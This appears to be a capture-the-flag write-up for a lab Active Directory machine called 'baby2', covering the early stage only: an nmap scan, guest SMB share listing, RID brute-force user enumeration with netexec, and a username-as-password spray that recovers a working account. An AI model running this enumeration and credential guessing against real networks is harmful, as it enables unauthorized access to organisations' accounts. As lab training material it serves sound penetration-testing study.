# baby2

## NMAP

```console
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-03 03:18:14Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Issuer: commonName=baby2-CA/domainComponent=baby2
|_ssl-date: TLS randomness does not represent time
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
<unsupported>, DNS:dc.baby2.vl
| Issuer: commonName=baby2-CA/domainComponent=baby2
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Issuer: commonName=baby2-CA/domainComponent=baby2
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50011/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60648/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61553/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows


```

## SMB

* List shares as Null or Guest account via `nxc`

```bash
$ nxc smb $IP -u Guest -p '' --shares

Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
apps            READ            
C$                              Default share
docs                            
homes           READ,WRITE      
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL                          Logon server share 

```

* We can enumerate users by passing the argument `--rid-brute`

```bash
$ nxc smb $IP -u 'guest' -p '' --rid-brute

BABY2\Enterprise Read-only Domain Controllers (SidTypeGroup)
BABY2\Administrator (SidTypeUser)
BABY2\Guest (SidTypeUser)
BABY2\krbtgt (SidTypeUser)
BABY2\Domain Admins (SidTypeGroup)
BABY2\Domain Users (SidTypeGroup)
BABY2\Domain Guests (SidTypeGroup)
BABY2\Domain Computers (SidTypeGroup)
BABY2\Domain Controllers (SidTypeGroup)
BABY2\Cert Publishers (SidTypeAlias)
BABY2\Schema Admins (SidTypeGroup)
BABY2\Enterprise Admins (SidTypeGroup)
BABY2\Group Policy Creator Owners (SidTypeGroup)
BABY2\Read-only Domain Controllers (SidTypeGroup)
BABY2\Cloneable Domain Controllers (SidTypeGroup)
BABY2\Protected Users (SidTypeGroup)
BABY2\Key Admins (SidTypeGroup)
BABY2\Enterprise Key Admins (SidTypeGroup)
BABY2\RAS and IAS Servers (SidTypeAlias)
BABY2\Allowed RODC Password Replication Group (SidTypeAlias)
BABY2\Denied RODC Password Replication Group (SidTypeAlias)
BABY2\DC$ (SidTypeUser)
BABY2\DnsAdmins (SidTypeAlias)
BABY2\DnsUpdateProxy (SidTypeGroup)
BABY2\gpoadm (SidTypeUser)
BABY2\office (SidTypeGroup)
BABY2\Joan.Jennings (SidTypeUser)
BABY2\Mohammed.Harris (SidTypeUser)
BABY2\Harry.Shaw (SidTypeUser)
BABY2\Carl.Moore (SidTypeUser)
BABY2\Ryan.Jenkins (SidTypeUser)
BABY2\Kieran.Mitchell (SidTypeUser)
BABY2\Nicola.Lamb (SidTypeUser)
BABY2\Lynda.Bailey (SidTypeUser)
BABY2\Joel.Hurst (SidTypeUser)
BABY2\Amelia.Griffiths (SidTypeUser)
BABY2\library (SidTypeUser)
BABY2\legacy (SidTypeGroup)
```

* we can check for password re-use using the username and blank password

```bash
nxc smb $IP -u users.txt -p users.txt --continue-on-success --shares

[+] baby2.vl\Carl.Moore:Carl.Moore 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
apps            READ,WRITE      
C$                              Default share
docs            READ,WRITE      
homes           READ,WRITE      
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share
```
